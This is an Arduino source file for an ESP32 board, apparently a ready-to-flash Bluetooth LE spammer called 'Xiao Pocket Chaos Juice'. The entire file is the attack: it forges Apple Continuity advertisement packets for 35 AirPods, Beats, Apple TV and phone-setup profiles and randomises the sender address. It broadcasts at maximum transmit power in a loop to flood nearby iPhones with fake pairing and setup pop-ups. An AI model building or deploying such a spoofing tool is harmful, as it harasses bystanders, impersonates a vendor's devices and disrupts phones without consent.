/*
 * Xiao Pocket Chaos Juice - Brainrot BLE Spammer
 *
 * Seeed XIAO ESP32C3 / ESP32S3 (USB power). No extra wiring.
 *
 * Arduino IDE: board package esp32 by Espressif, e.g. XIAO_ESP32C3, USB CDC optional.
 *
 * Sends BLE legacy advertisements that mimic Apple Continuity-style manufacturer data
 * (see EvilAppleJuice-ESP32 generatePacket / devices.hpp). Public reverse-engineering
 * context: github.com/furiousMAC/continuity (Proximity Pairing & related messages).
 *
 * Inspired by EvilAppleJuice-ESP32 / ronaldstoner/AppleJuice.
 */

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>
#include <esp_bt.h>

#define MAX_TX_POWER ESP_PWR_LVL_P21   // 21 dBm max for ESP32-S3

// Complete Local Name in scan response: legacy SR payload is 31 bytes; one 0x09 AD
// uses 2 bytes overhead, so keep names ≤ 29 ASCII chars (all NAMES[] below satisfy this).
// iOS proximity card text comes from manufacturer data + model id, not this name.
#define MAX_BLE_DISPLAY_NAME 29

// ── Brainrot names (edit / add freely) ────────────────────────────────────────
const char* NAMES[] = {
  "Skibidi Rizz AirPods",
  "Sigma Aura iPhone 17",
  "Ohio Final Boss AirDrop",
  "Mog Your Connection",
  "Euphoria S3 Spoiler",
  "Yoga Pose Challenge From Hell",
  "Free Coachella Ticket (real)",
  "Level 10 Gyatt Alert",
  "Fanum Tax FindMy",
  "Looksmaxxing AirPods",
  "Edge Lord Apple TV",
  "Brainrot HomePod",
  "Goon Cave Setup",
  "Rizzler AirDrop",
  "Mewing Maxxing Device",
  "Skibidi Toilet AirPods",
  "Ohio Sigma Setup",
  "Gyatt Rizzler 3000",
  "Fanum Tax HomePod",
  "Mogging Vision Pro",
  "Level 100 Aura iPhone",
  "Brainrot Maxxing iPad",
  "Sigma Skibidi Watch",
  "Rizz Ohio AirDrop",
  "Gooning AppleTV",
  "Mewing iPhone 17 Pro",
  "Gyatt Maxxing AirPods",
  "Skibidi Toilet Pro Max",
  "Aura Points AppleTV",
  "Looksmaxxing iPad",
  "Edge Maxxing HomePod",
  "Fanum Tax Sigma",
  "Ohio Brainrot Watch",
  "Rizzler 9000 Setup",
  "NPC AirPods Pro",
  "Touch Grass Pods",
  "Main Character AirPods",
  "L + Ratio Beats",
  "Cope & Seethe TV",
  "Rent Free HomePod mini",
  "Mid AirPods (real)",
  "Based AirDrop King",
  "Chad Vision Pro",
  "W Rizzzzz Setup",
  "Ligma Apple TV 4K",
};
const int NUM_NAMES = sizeof(NAMES) / sizeof(NAMES[0]);

// ── Apple device profiles ─────────────────────────────────────────────────────
enum PktType { AUDIO, SETUP };
struct Dev { const char* name; uint8_t id; PktType type; };

// Full device list from EvilAppleJuice-ESP32 ALL_DEVICES (35 entries). Same model id
// can appear in AUDIO vs SETUP with different outer bytes — iOS treats them differently
// (e.g. 0x24 AUDIO vs 0x24 SETUP).
const Dev DEVS[] = {
  // 31-byte AUDIO — headphone / earbud / software-update style ads
  {"Airpods",                   0x02, AUDIO},
  {"Power Beats",               0x03, AUDIO},
  {"Beats X",                   0x05, AUDIO},
  {"Beats Solo 3",              0x06, AUDIO},
  {"Beats Studio 3",            0x09, AUDIO},
  {"Airpods Max",               0x0a, AUDIO},
  {"Power Beats Pro",           0x0b, AUDIO},
  {"Beats Solo Pro",            0x0c, AUDIO},
  {"Airpods Pro",               0x0e, AUDIO},
  {"Airpods Gen 2",             0x0f, AUDIO},
  {"Beats Flex",                0x10, AUDIO},
  {"Beats Studio Buds",         0x11, AUDIO},
  {"Beats Fit Pro",             0x12, AUDIO},
  {"Airpods Gen 3",             0x13, AUDIO},
  {"Airpods Pro Gen 2",         0x14, AUDIO},
  {"Beats Studio Buds Plus",    0x16, AUDIO},
  {"Beats Studio Pro",          0x17, AUDIO},
  {"Airpods Pro Gen 2 USB-C",   0x24, AUDIO},
  {"Beats Solo 4",              0x25, AUDIO},
  {"Beats Solo Buds",           0x26, AUDIO},
  {"Software update",           0x2e, AUDIO},
  {"Powerbeats fit",            0x2f, AUDIO},
  // 23-byte SETUP — Apple TV / HomePod / Vision / transfer flows
  {"AppleTV Setup",                  0x01, SETUP},
  {"Transfer Number",                0x02, SETUP},
  {"AppleTV Pair",                   0x06, SETUP},
  {"Setup New Phone",                0x09, SETUP},
  {"Homepod Setup",                  0x0b, SETUP},
  {"AppleTV Homekit Setup",          0x0d, SETUP},
  {"AppleTV Keyboard Setup",         0x13, SETUP},
  {"TV Color Balance",               0x1e, SETUP},
  {"AppleTV New User",               0x20, SETUP},
  {"Vision Pro",                     0x24, SETUP},
  {"AppleTV Connecting to Network",  0x27, SETUP},
  {"AppleTV AppleID Setup",          0x2b, SETUP},
  {"AppleTV Wireless Audio Sync",    0xc0, SETUP},
};
const int NUM_DEVS = sizeof(DEVS) / sizeof(DEVS[0]);
static_assert(NUM_DEVS == 35, "DEVS must match EvilAppleJuice ALL_DEVICES count");

BLEAdvertising* adv;

static void copyBleDisplayName(const char* src, char out[30]) {
  size_t i = 0;
  for (; i < MAX_BLE_DISPLAY_NAME && src[i]; ++i)
    out[i] = src[i];
  out[i] = '\0';
}

/*
 * Raw AD payload (single manufacturer-specific structure) — matches devices.cpp in
 * EvilAppleJuice-ESP32. BLE layout: [Len][0xFF][Company ID LE][Apple payload...]
 *
 *   buf[0]     AD length (0x1e = 30 → 30 octets after this byte in that field)
 *   buf[1]     0xFF = Manufacturer Specific Data
 *   buf[2..3]  Company ID 0x004C little-endian → 4C 00 (Apple Inc.)
 *
 * AUDIO (APPLE_AUDIO): 31 bytes total. Apple payload continues; device/model id is
 *   written at buf[7] (EvilAppleJuice / AirPods-spoof template).
 *
 * SETUP (APPLE_SETUP): 23 bytes total; model id at buf[13] (shorter “setup” template).
 *
 * iOS decides which *system* string to show from this binary template + id, not from
 * NAMES[] or scan-response name.
 */
void buildPacket(const Dev& d, uint8_t* buf, size_t& len) {
  memset(buf, 0, 31);
  if (d.type == AUDIO) {
    len = 31;
    const uint8_t hdr[]  = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
    const uint8_t body[] = {0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00,
                             0x45, 0x12, 0x12, 0x12};
    memcpy(buf, hdr, 7);
    buf[7] = d.id;
    memcpy(buf + 8, body, 11);
  } else {
    len = 23;
    const uint8_t pre[]  = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                             0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
    const uint8_t suf[]  = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    memcpy(buf, pre, 13);
    buf[13] = d.id;
    memcpy(buf + 14, suf, 9);
  }
}

#if defined(CONFIG_BLUEDROID_ENABLED)
static void setRandomStaticAddr(BLEAdvertising* a) {
  esp_bd_addr_t addr = {};
  for (int i = 0; i < 6; i++) {
    addr[i] = (uint8_t)random(256);
  }
  addr[0] |= 0xF0;  // random static (EvilAppleJuice-style)
  a->setDeviceAddress(addr, BLE_ADDR_TYPE_RANDOM);
}
#endif

void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("\n=== XIAO POCKET CHAOS JUICE ===");
  Serial.println("Brainrot BLE Spammer v1.0  |  XIAO ESP32S3");
  Serial.println("Spamming nearby iPhones with maximum chaos...\n");

  BLEDevice::init("XiaoChaosJuice");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  Serial.println("TX Power: MAX (21 dBm)");

  BLEServer* srv = BLEDevice::createServer();
  adv = srv->getAdvertising();
  adv->setScanResponse(true);

  randomSeed(esp_random());

  Serial.println("Chaos starts in 2 s...\n");
  delay(2000);
  Serial.println("=== CHAOS MODE ACTIVATED ===");
}

void loop() {
  const char* name = NAMES[random(NUM_NAMES)];
  const Dev&  dev  = DEVS[random(NUM_DEVS)];

  uint8_t pkt[31];
  size_t  len = 0;
  buildPacket(dev, pkt, len);

  char displayName[30];
  copyBleDisplayName(name, displayName);

  BLEAdvertisementData ad;
  ad.addData((char*)pkt, len);

  BLEAdvertisementData scan;
  scan.setName(String(displayName));

  adv->setAdvertisementData(ad);
  adv->setScanResponseData(scan);

#if defined(CONFIG_BLUEDROID_ENABLED)
  setRandomStaticAddr(adv);
#endif
  // NimBLE: conn_mode 0 = non-connectable, 2 = undirected connectable (ble_gap.h).
  // Rotates like mixing ADV_NONCONN_IND vs ADV_IND intent; avoids 1 = directed.
  adv->setAdvertisementType(random(2) * 2);

  adv->start();

  // Log every 5 seconds
  static uint32_t lastLog = 0;
  if (millis() - lastLog > 5000) {
    Serial.printf("[%lus] \"%s\" -> %s (%s)\n",
      millis() / 1000, name, dev.name,
      dev.type == AUDIO ? "Audio" : "Setup");
    lastLog = millis();
  }

  delay(200);          // broadcast window
  adv->stop();
  delay(800 + random(350));  // 800-1150 ms gap

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER); // keep power maxed
}
